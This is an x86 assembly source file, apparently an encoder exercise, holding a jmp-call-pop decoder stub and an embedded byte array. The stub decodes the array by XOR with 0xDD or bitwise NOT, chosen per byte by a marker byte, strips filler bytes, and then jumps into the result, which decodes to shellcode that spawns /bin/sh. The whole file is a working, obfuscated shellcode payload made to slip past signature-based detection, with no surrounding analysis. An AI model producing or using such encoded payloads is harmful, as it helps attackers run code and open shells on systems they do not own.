global _start			

section .text
_start:


	jmp short call_decoder
	
	
decoder:
        ; the sequence of the chars in shellcode is: placehlder,obfuscated shellcode char,random char
	pop esi
        lea edi, [esi]                  ; load the first placeholder char in edi
        xor eax, eax
        xor ebx, ebx

switch:

        mov bl, byte [esi + eax]        ; load the placeholder in EBX
        cmp bl, 0xaa                    ; compare it with the shellcode end character
        jz shellcode                    ; if whe reached the end jump to the shellcode
        cmp bl, 0xbb                    ; if the placeholder is 0xbb Zero Flag is set
        jz xordecode                    ; if ZF is set jump to XOR decoder
        jmp notdecode                  	; otherwise jump to NOT decoder

xordecode:

        mov bl, byte [esi + eax + 1]    ; load the second char (the good one) from where we are
        mov byte [edi], bl              ; load it in edi
        xor byte [edi], 0xDD            ; xoring char with 0xdd to obtain the original one
        inc edi                         ; increment edi
        add al, 3                       ; move to the next placeholder char
        jmp short switch                ; loop to decode

notdecode:
        
        mov bl, byte [esi + eax + 1]    ; load the second char (the good one) from we are
        mov byte [edi], bl              ; load it in edi
        not byte [edi]                  ; denot char
        inc edi                         ; increment edi
        add al, 3                       ; move to the next placeholder char
        jmp short switch                ; loop to decode

call_decoder:
	
	call decoder
	shellcode: db 0xbb,0xec,0x73,0xcc,0x3f,0x9d,0xbb,0x8d,0x51,0xbb,0xb5,0x1b,0xbb,0xb3,0x22,0xbb,0xf2,0x79,0xbb,0xae,0x8e,0xbb,0xb5,0x61,0xbb,0xb5,0x3d,0xbb,0xf2,0x6e,0xbb,0xf2,0x9f,0xbb,0xbf,0x10,0xbb,0xb4,0x89,0xcc,0x76,0x2d,0xcc,0x1c,0x2f,0xbb,0x8d,0x91,0xcc,0x76,0x7e,0xcc,0x1d,0x92,0xbb,0x8e,0x80,0xcc,0x76,0x7b,0xcc,0x1e,0xa7,0xcc,0x4f,0x7f,0xbb,0xd6,0x2b,0xcc,0x32,0x24,0xcc,0x7f,0x37,0xaa
